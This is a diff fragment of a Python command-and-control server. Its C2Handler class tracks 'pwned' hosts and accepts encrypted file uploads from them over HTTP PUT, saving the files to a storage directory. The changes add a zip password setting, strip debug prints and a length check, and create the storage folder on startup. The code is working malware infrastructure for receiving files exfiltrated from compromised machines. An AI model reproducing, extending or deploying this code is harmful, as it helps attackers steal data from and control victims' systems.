@@ -6,8 +6,9 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import unquote_plus
 from crypt import cipher
 from settings import PORT, BIND_ADDR, CMD_REQUEST, RESPONSE_PATH, INPUT_TIMEOUT, KEEP_ALIVE_CMD,\
-    CWD_RESPONSE, FILE_REQUEST, FILE_SEND, STORAGE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
+    CWD_RESPONSE, FILE_REQUEST, ZIP_PASSWORD, FILE_SEND, STORAGE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
 from inputimeout import inputimeout, TimeoutOccurred
+from os import mkdir, path
 
 def get_new_session():
     """ This function check if other sessions exists. If none re-initialize variables. However, if sessions do exist,
@@ -116,17 +117,11 @@ class C2Handler(BaseHTTPRequestHandler):
         if self.path.startswith(FILE_SEND + "/"):
             self.http_response(HTTPStatusCode.OK.value)
             filename = self.path.split(FILE_SEND + "/")[1]
-
-            print(f"filename before decryption {filename}")
             filename = cipher.decrypt(filename.encode()).decode()
             incoming_file = STORAGE + "/" + filename
-            print(incoming_file)
             file_length = int(self.headers["Content-Length"])
-            if file_length is None:
-                print(f"{incoming_file} has no data. Aborting transfer.")
-            else:
-                with open(incoming_file, 'wb') as file_handle:
-                    file_handle.write(cipher.decrypt(self.rfile.read(file_length)))
+            with open(incoming_file, 'wb') as file_handle:
+                file_handle.write(cipher.decrypt(self.rfile.read(file_length)))
         else:
             print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP PUT. why ?\n")
 
@@ -158,6 +153,9 @@ client_account = ""
 client_hostname = ""
 pwned_id = 0
 pwned_dict = {}
+
+if not path.isdir(STORAGE):
+    mkdir(STORAGE)
 
 print("server version:", C2Handler.server_version)
 print("sys_version:", C2Handler.sys_version)
